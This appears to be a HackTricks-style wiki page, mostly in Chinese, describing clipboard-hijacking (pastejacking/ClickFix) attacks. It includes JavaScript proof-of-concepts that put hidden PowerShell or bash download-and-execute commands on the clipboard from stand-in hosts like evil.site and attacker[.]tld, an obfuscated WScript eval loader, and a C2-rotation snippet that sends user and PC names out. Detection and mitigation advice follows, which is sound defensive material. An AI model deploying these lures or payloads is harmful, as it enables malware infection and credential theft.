# Clipboard Hijacking (Pastejacking) 攻击

{{#include ../../banners/hacktricks-training.md}}

> "永远不要粘贴你没有自己复制过的任何内容。" – 古老但仍然有效的建议

## 概述

Clipboard hijacking – 也称为 *pastejacking* – 利用用户在复制粘贴命令时通常不会检查其内容的习惯。恶意网页（或任何支持 JavaScript 的环境，例如 Electron 或 Desktop 应用）以编程方式将攻击者控制的文本放入系统剪贴板。通常通过精心设计的社交工程指令鼓励受害者按 **Win + R**（Run dialog）、**Win + X**（Quick Access / PowerShell），或打开终端并 *粘贴* 剪贴板内容，从而立即执行任意命令。

因为 **没有文件被下载，也没有附件被打开**，该技术能绕过大多数监控附件、宏或直接命令执行的邮箱和网页内容安全控制。因此，该攻击在投放常见恶意软件家族（如 NetSupport RAT、Latrodectus loader 或 Lumma Stealer）的钓鱼活动中很流行。

## 强制复制按钮和隐藏负载（macOS one-liners）

一些 macOS infostealers 会克隆安装站点（例如 Homebrew），并 **强制使用“Copy”按钮**，使用户无法只选中可见文本。剪贴板条目包含预期的安装命令以及附加的 Base64 负载（例如 `...; echo <b64> | base64 -d | sh`），因此一次粘贴会执行两部分，而 UI 隐藏了额外的阶段。

## JavaScript Proof-of-Concept
```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
navigator.clipboard.writeText(payload)
.then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```
Older campaigns used `document.execCommand('copy')`, newer ones rely on the asynchronous **Clipboard API** (`navigator.clipboard.writeText`).

## ClickFix / ClearFake 流程

1. 用户访问了一个输入错误的或被入侵的网站（例如 `docusign.sa[.]com`）。
2. 注入的 **ClearFake** JavaScript 调用 `unsecuredCopyToClipboard()` 辅助函数，悄然把一个 Base64 编码的 PowerShell 单行命令存入剪贴板。
3. HTML 指示告诉受害者：*“按 **Win + R**，粘贴命令并按 Enter 以解决问题。”*
4. `powershell.exe` 执行，下载一个包含合法可执行文件和恶意 DLL 的存档（经典的 DLL sideloading）。
5. 加载器解密后续阶段，注入 shellcode 并安装持久性（例如计划任务）——最终运行 NetSupport RAT / Latrodectus / Lumma Stealer。

### NetSupport RAT 示例链
```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```
* `jp2launcher.exe` (合法的 Java WebStart) 在其目录中搜索 `msvcp140.dll`。
* 恶意 DLL 通过 **GetProcAddress** 动态解析 API，通过 **curl.exe** 下载两个二进制文件 (`data_3.bin`, `data_4.bin`)，使用滚动 XOR 密钥 "https://google.com/" 解密它们，注入最终 shellcode 并将 **client32.exe** (NetSupport RAT) 解压到 `C:\ProgramData\SecurityCheck_v1\`。

### Latrodectus Loader
```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```
1. 使用 **curl.exe** 下载 `la.txt`
2. 在 **cscript.exe** 中执行 JScript 下载器
3. 获取 MSI payload → 在已签名的应用旁放置 `libcef.dll` → DLL sideloading → shellcode → Latrodectus

### Lumma Stealer 通过 MSHTA
```
mshta https://iplogger.co/xxxx =+\\xxx
```
The **mshta** 调用会启动一个隐藏的 PowerShell 脚本，该脚本会检索 `PartyContinued.exe`，解压 `Boat.pst`（CAB），通过 `extrac32` 与文件拼接重建 `AutoIt3.exe`，并最终运行 `.a3x` 脚本，将浏览器凭证外传到 `sumeriavgv.digital`。

## ClickFix: Clipboard → PowerShell → JS eval → Startup LNK with rotating C2 (PureHVNC)

一些 ClickFix 活动完全跳过文件下载，指示受害者粘贴一行命令，该命令通过 WSH 获取并执行 JavaScript，实现持久化，并每天轮换 C2。观测到的示例链：
```powershell
powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new
ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
```
Key traits
- 混淆的 URL 在运行时被反转以对抗随意检查。
- JavaScript 通过 Startup LNK (WScript/CScript) 持久化自身，并根据当前日期选择 C2 – 实现快速的域名轮换。

Minimal JS fragment used to rotate C2s by date:
```js
function getURL() {
var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
var current_datetime = new Date().getTime();
var no_days = getDaysDiff(0, current_datetime);
return 'https://'
+ getListElement(C2_domain_list, no_days)
+ '/Y/?t=' + current_datetime
+ '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
}
```
Next stage commonly deploys a loader that establishes persistence and pulls a RAT (e.g., PureHVNC), often pinning TLS to a hardcoded certificate and chunking traffic.

Detection ideas specific to this variant
- 进程树： `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js` (or `cscript.exe`)。
- 启动痕迹：在 `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` 的 LNK，调用 WScript/CScript，使用位于 `%TEMP%`/`%APPDATA%` 下的 JS 路径。
- Registry/RunMRU 和命令行遥测包含 `.split('').reverse().join('')` 或 `eval(a.responseText)`。
- 重复出现 `powershell -NoProfile -NonInteractive -Command -`，通过较大的 stdin 载荷提供长脚本以避免超长命令行。
- 定时任务随后执行 LOLBins，例如在看起来像 updater 的任务/路径（例如 `\GoogleSystem\GoogleUpdater`）下执行 `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"`。

Threat hunting
- 每日轮换的 C2 主机名和 URL，匹配 `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>` 模式。
- 关联 clipboard 写入事件，随后 Win+R 粘贴并立即执行 `powershell.exe`。

Blue-teams can combine clipboard, process-creation and registry telemetry to pinpoint pastejacking abuse:

* Windows Registry: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` 会保留 **Win + R** 命令历史 – 查找异常的 Base64 / 混淆条目。
* Security Event ID **4688** (Process Creation)，其中 `ParentImage` == `explorer.exe` 且 `NewProcessName` 在 { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` }。
* Event ID **4663**：在可疑的 4688 事件之前，关注位于 `%LocalAppData%\Microsoft\Windows\WinX\` 或临时文件夹下的文件创建。
* EDR clipboard sensors（如果存在）– 关联 `Clipboard Write` 紧接着出现的新 PowerShell 进程。

## IUAM-style verification pages (ClickFix Generator): clipboard copy-to-console + OS-aware payloads

近期活动大量生成假 CDN/浏览器 验证页面（"Just a moment…"，IUAM-style），强迫用户将 clipboard 中的 OS 特定命令复制到本地控制台。这样将执行从浏览器沙箱转移到本地，并能在 Windows 和 macOS 上运行。

构建器生成页面的关键特征
- 通过 `navigator.userAgent` 进行 OS 检测以定制 payloads（Windows PowerShell/CMD vs. macOS Terminal）。对不支持的 OS 可使用诱饵/空操作以维持假象。
- 在友好 UI 操作（checkbox/Copy）上自动将内容复制到 clipboard，但可见文本可能与 clipboard 内容不同。
- 屏蔽移动端并显示带有逐步说明的弹出框：Windows → Win+R→粘贴→Enter；macOS → open Terminal→粘贴→Enter。
- 可选混淆和单文件注入器，用以覆盖被入侵站点的 DOM，替换为 Tailwind 风格的验证 UI（无需注册新域名）。

示例： clipboard mismatch + OS-aware branching
```html
<div class="space-y-2">
<label class="inline-flex items-center space-x-2">
<input id="chk" type="checkbox" class="accent-blue-600"> <span>I am human</span>
</label>
<div id="tip" class="text-xs text-gray-500">If the copy fails, click the checkbox again.</div>
</div>
<script>
const ua = navigator.userAgent;
const isWin = ua.includes('Windows');
const isMac = /Mac|Macintosh|Mac OS X/.test(ua);
const psWin = `powershell -nop -w hidden -c "iwr -useb https://example[.]com/cv.bat|iex"`;
const shMac = `nohup bash -lc 'curl -fsSL https://example[.]com/p | base64 -d | bash' >/dev/null 2>&1 &`;
const shown = 'copy this: echo ok';            // benign-looking string on screen
const real = isWin ? psWin : (isMac ? shMac : 'echo ok');

function copyReal() {
// UI shows a harmless string, but clipboard gets the real command
navigator.clipboard.writeText(real).then(()=>{
document.getElementById('tip').textContent = 'Now press Win+R (or open Terminal on macOS), paste and hit Enter.';
});
}

document.getElementById('chk').addEventListener('click', copyReal);
</script>
```
macOS 初次运行的持久化
- 使用 `nohup bash -lc '<fetch | base64 -d | bash>' >/dev/null 2>&1 &` 以便在终端关闭后继续执行，减少可见痕迹。

在已被入侵网站上进行原位页面接管
```html
<script>
(async () => {
const html = await (await fetch('https://attacker[.]tld/clickfix.html')).text();
document.documentElement.innerHTML = html;                 // overwrite DOM
const s = document.createElement('script');
s.src = 'https://cdn.tailwindcss.com';                     // apply Tailwind styles
document.head.appendChild(s);
})();
</script>
```
Detection & hunting ideas specific to IUAM-style lures
- Web: Pages that bind Clipboard API to verification widgets; mismatch between displayed text and clipboard payload; `navigator.userAgent` branching; Tailwind + single-page replace in suspicious contexts.
- Windows endpoint: `explorer.exe` → `powershell.exe`/`cmd.exe` shortly after a browser interaction; batch/MSI installers executed from `%TEMP%`.
- macOS endpoint: Terminal/iTerm spawning `bash`/`curl`/`base64 -d` with `nohup` near browser events; background jobs surviving terminal close.
- Correlate `RunMRU` Win+R history and clipboard writes with subsequent console process creation.

See also for supporting techniques

{{#ref}}
clone-a-website.md
{{#endref}}

{{#ref}}
homograph-attacks.md
{{#endref}}

## 缓解措施

1. 浏览器强化 – 禁用剪贴板写入访问（`dom.events.asyncClipboard.clipboardItem` 等）或要求用户手势。
2. 安全意识 – 教导用户*输入*敏感命令，或先将命令粘贴到文本编辑器中再执行。
3. PowerShell Constrained Language Mode / Execution Policy + Application Control，用于阻止任意单行命令。
4. 网络控制 – 阻断到已知 pastejacking 和 malware C2 域名的外发请求。

## 相关技巧

* **Discord Invite Hijacking** 经常在引诱用户进入恶意服务器后滥用相同的 ClickFix 方法：

{{#ref}}
discord-invite-hijacking.md
{{#endref}}

## References

- [Fix the Click: Preventing the ClickFix Attack Vector](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)
- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [The ClickFix Factory: First Exposure of IUAM ClickFix Generator](https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/)
- [2025, the year of the Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)

{{#include ../../banners/hacktricks-training.md}}
